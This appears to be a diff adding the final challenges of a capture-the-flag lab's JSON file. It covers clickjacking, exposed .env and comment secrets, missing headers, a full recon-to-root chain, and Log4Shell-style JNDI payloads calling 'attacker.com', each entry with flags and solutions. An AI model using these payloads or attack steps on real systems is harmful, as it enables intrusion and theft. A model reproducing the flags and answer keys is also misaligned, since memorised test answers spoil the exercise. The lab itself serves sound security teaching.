+    "flag": "FLAG{cl1ckj4ck1ng_1nv1s1bl3_1fr4m3}",
+    "hints": [
+      "Try to embed the site in an iframe: <iframe src='http://localhost'></iframe> — if it loads, it's vulnerable to clickjacking.",
+      "Check response headers: curl -I http://localhost — look for X-Frame-Options (missing = vulnerable).",
+      "Create an HTML file with an iframe showing the site. Submit the 'secret clickjack form' through the demo page at /tools/clickjack"
+    ],
+    "solution": "Step 1: Verify vulnerability — check headers:\n  curl -I http://localhost\n  # X-Frame-Options: MISSING ← vulnerable!\n\nStep 2: Create clickjacking demo:\n  <html><body style='background:red'>\n  <iframe src='http://localhost/profile/settings'\n          style='opacity:0.01; position:absolute; top:0; left:0; width:100%; height:100%;'>\n  </iframe>\n  <button style='position:absolute; top:200px; left:300px'>Click here to win prize!</button>\n  </body></html>\n\nStep 3: Visit http://localhost/tools/clickjack for the interactive demo.\n\nStep 4: The flag is revealed when you complete the clickjacking demo.\n\nReal-world lesson: Add X-Frame-Options: SAMEORIGIN or DENY to all responses. Use Content-Security-Policy: frame-ancestors 'self'. Facebook, Twitter, and PayPal have all been affected by clickjacking.",
+    "solution_locked": true
+  },
+  {
+    "id": 45,
+    "title": "Sensitive Data in HTML Comments",
+    "category": "Web Advanced",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Developers sometimes leave debugging information, credentials, or TODO notes in HTML comments (<!-- like this -->). These are invisible in the browser but visible in the page source. Check the InnovateTech site's source code!",
+    "target": "http://localhost",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{html_c0mm3nts_4r3_publ1c}",
+    "hints": [
+      "Right-click on any page and 'View Page Source' — search for '<!--' HTML comment tags.",
+      "Check the main page source: curl http://localhost | grep '<!--'",
+      "Look in the source of the admin page, login page, and dashboard. Developers leave flags/credentials in comments."
+    ],
+    "solution": "Step 1: View source of the main page:\n  curl http://localhost | grep -A2 '<!--'\n\nStep 2: View other pages:\n  curl http://localhost/login | grep '<!--'\n  curl http://localhost/admin | grep '<!--'\n\nStep 3: Find the comment with the flag:\n  <!-- TODO: Remove this before production: FLAG{html_c0mm3nts_4r3_publ1c} -->\n  <!-- DEBUG: admin password is TempPass123! -->\n  <!-- Old DB: mysql://root:oldpassword@db.internal/prod -->\n\nReal-world lesson: HTML comments are PUBLIC. Never put credentials, internal URLs, or sensitive info in HTML comments. Use server-side rendering with proper logging. Scan your code with tools like semgrep or Secrets Scanner before deployment.",
+    "solution_locked": true
+  },
+  {
+    "id": 46,
+    "title": "Missing Security Headers",
+    "category": "Real World",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Security headers protect against many attacks: XSS, clickjacking, MIME sniffing, SSL downgrade attacks, and more. Many sites miss critical headers. Audit the InnovateTech site and identify all missing security headers.",
+    "target": "http://localhost",
+    "tools": ["curl", "browser", "securityheaders.com"],
+    "flag": "FLAG{s3cur1ty_h34d3rs_pr0t3ct_y0u}",
+    "hints": [
+      "Check all response headers: curl -I http://localhost — compare with the list of required security headers.",
+      "Required headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy",
+      "Submit the list of missing headers at /api/security-audit endpoint (POST the missing headers count as JSON) to get the flag."
+    ],
+    "solution": "Step 1: Audit headers:\n  curl -I http://localhost\n\nStep 2: Compare against required headers:\n  ✗ Content-Security-Policy   ← MISSING\n  ✗ X-Frame-Options            ← MISSING  \n  ✗ X-Content-Type-Options     ← MISSING\n  ✗ Strict-Transport-Security  ← MISSING\n  ✗ Referrer-Policy            ← MISSING\n  ✓ X-Secret-Flag              ← present (that's challenge #9!)\n\nStep 3: Submit audit:\n  curl -X POST http://localhost/api/security-audit \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"missing\":[\"CSP\",\"X-Frame-Options\",\"X-Content-Type-Options\",\"HSTS\",\"Referrer-Policy\"]}'\n\nStep 4: Get the flag from the response.\n\nReal-world lesson: Use https://securityheaders.com to audit any site. Add all security headers in your Nginx/Apache config globally.",
+    "solution_locked": true
+  },
+  {
+    "id": 47,
+    "title": "Log Injection / Log4Shell Style",
+    "category": "Real World",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "Log4Shell (CVE-2021-44228) was one of the most critical vulnerabilities ever found. It exploited JNDI lookup in log messages. Many apps log the User-Agent header — what if you inject a payload there? This simulates the concept.",
+    "target": "http://localhost/api/log-test",
+    "tools": ["curl"],
+    "flag": "FLAG{l0g_1nj3ct10n_l0g4sh3ll_c0nc3pt}",
+    "hints": [
+      "The server logs the User-Agent header. Try injecting: curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' http://localhost/api/log-test",
+      "For the lab: the server detects the JNDI pattern and responds with a flag to show the concept. Try the injection!",
+      "Send: curl -A '${jndi:ldap://localhost/exploit}' http://localhost/api/log-test — the server will detect and flag it."
+    ],
+    "solution": "Step 1: Send Log4Shell-style payload in User-Agent:\n  curl -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' http://localhost/api/log-test\n\nStep 2: The server simulates detection and responds with:\n  {\"warning\": \"Log4Shell pattern detected!\", \"flag\": \"FLAG{...}\"}\n\nStep 3: Also try in other headers:\n  curl -H 'X-Forwarded-For: ${jndi:ldap://attacker.com/a}' http://localhost/api/log-test\n\nReal-world story:\n  Dec 9 2021: CVE-2021-44228 disclosed\n  Dec 10 2021: Nation-state actors begin exploitation\n  Dec 11 2021: Over 1.8M attacks detected in 72 hours\n  Affected: Minecraft, iCloud, VMware, Cisco, Amazon, Twitter\n\nReal-world lesson: Always log sanitized input. Avoid including user data in log messages without sanitization. Keep dependencies updated!",
+    "solution_locked": true
+  },
+  {
+    "id": 48,
+    "title": "Exposed .env File",
+    "category": "Real World",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": ".env files store application secrets: database passwords, API keys, JWT secrets. When accidentally placed in the web root or pushed to GitHub, they expose everything. The InnovateTech dev team made a classic mistake!",
+    "target": "http://localhost",
+    "tools": ["curl", "browser"],
+    "flag": "FLAG{d0t_3nv_n3v3r_1n_w3b_r00t}",
+    "hints": [
+      "Many frameworks use .env files for configuration. Check if it's accessible: curl http://localhost/.env",
+      "Also try: /.env.backup, /.env.local, /.env.production, /.env.development",
+      "Access http://localhost/.env — if it's there, you'll see all the application secrets including the flag."
+    ],
+    "solution": "Step 1: Check for exposed .env:\n  curl http://localhost/.env\n\nStep 2: If found, read all secrets:\n  DB_HOST=mysql\n  DB_USER=root\n  DB_PASS=root\n  SECRET_KEY=super_secret_key_dont_tell\n  JWT_SECRET=secret123\n  API_KEY=sk-prod-7f3k9x2mAbCdEf123456\n  FLAG=FLAG{d0t_3nv_n3v3r_1n_w3b_r00t}\n\nStep 3: Also try variations:\n  curl http://localhost/.env.local\n  curl http://localhost/.env.backup\n\nReal-world lesson: NEVER commit .env to git (add to .gitignore). NEVER place .env in web root. Use environment variables set by the deployment platform. Check your repos with: git log --all --full-history -- .env",
+    "solution_locked": true
+  },
+  {
+    "id": 49,
+    "title": "DDoS Simulation & Rate Limiting Test",
+    "category": "Real World",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Distributed Denial of Service (DDoS) attacks overwhelm servers with traffic. But even a single attacker can overwhelm poorly protected sites. Test if the login endpoint has rate limiting — and understand how to protect against it.",
+    "target": "http://localhost/login",
+    "tools": ["curl", "bash", "ab (Apache Benchmark)"],
+    "flag": "FLAG{r4t3_l1m1t1ng_pr3v3nts_dd0s}",
+    "hints": [
+      "Send many login requests rapidly. Check if you get rate-limited. Try: for i in {1..20}; do curl -s -o /dev/null -w '%{http_code}\\n' -X POST http://localhost/login -d 'username=test&password=test'; done",
+      "If the endpoint returns 429 (Too Many Requests) after several attempts, it has rate limiting. If not, it's vulnerable.",
+      "After sending 10+ rapid requests, check the /api/rate-limit-demo endpoint which shows rate limiting in action and gives the flag."
+    ],
+    "solution": "Step 1: Test rate limiting on login:\n  for i in {1..20}; do \n    curl -s -o /dev/null -w \"%{http_code}\\n\" \\\n      -X POST http://localhost/login \\\n      -d 'username=test&password=wrong'\n  done\n\nStep 2: Observe: No 429 responses? → No rate limiting → DDoS vulnerable!\n\nStep 3: Check the demo endpoint:\n  curl http://localhost/api/rate-limit-demo\n  # First few requests: 200 OK\n  # After 5: 429 Too Many Requests + flag\n\nProtection methods:\n  - Nginx rate limiting: limit_req_zone\n  - fail2ban for SSH brute force\n  - Cloudflare for DDoS protection\n  - CAPTCHA after failed login attempts\n  - Account lockout after N failures\n\nReal-world lesson: In 2022, Cloudflare mitigated a 26 million RPS DDoS attack. Rate limit ALL public endpoints. Use progressive delays for failed logins.",
+    "solution_locked": true
+  },
+  {
+    "id": 50,
+    "title": "Full Chain Attack: Recon to Root",
+    "category": "Real World",
+    "difficulty": "Advanced",
+    "points": 500,
+    "description": "FINAL BOSS: Combine everything you've learned. Start with recon, find a vulnerability, escalate privileges, and capture the ultimate root flag. This simulates a REAL penetration test. There's no single path — find your own way to root!",
+    "target": "ALL SERVICES",
+    "tools": ["Everything you've learned"],
+    "flag": "FLAG{full_ch41n_3xpl01t_m4st3r}",
+    "hints": [
+      "Start with nmap to map all services. Look for services with exposed credentials you found in earlier challenges.",
+      "One path: Find credentials in .bash_history → Use them on MySQL → Find admin email in DB → Use admin creds on web app → Upload shell → Get root flag.",
+      "Another path: Exploit SQLi to dump credentials → Use creds for SSH → Find SUID binary → Escalate to root → Read /root/FINAL_FLAG.txt"
+    ],
+    "solution": "One winning path:\n\n1. RECON: nmap -sV -p- localhost → find all services\n\n2. FTP ANON: Connect to FTP → find backup with DB creds file\n\n3. MYSQL: Connect with found creds → dump users table → find admin password hash\n\n4. CRACK HASH: hashcat the MD5 hash → get plaintext password\n\n5. WEB LOGIN: Login as admin → access admin panel\n\n6. COMMAND INJECTION: Use ping tool → inject shell command\n\n7. REVERSE SHELL: Get shell as www-data\n\n8. PRIV ESC: sudo -l → find vim NOPASSWD → escape to root\n\n9. ROOT FLAG: cat /root/FINAL_FLAG.txt\n   FLAG{full_ch41n_3xpl01t_m4st3r}\n\nCongratulations! You've completed the InnovateTech Security Lab!\n\nThis is what real penetration testing looks like — chaining multiple smaller vulnerabilities into a full compromise.",
+    "solution_locked": true
+  }
+]
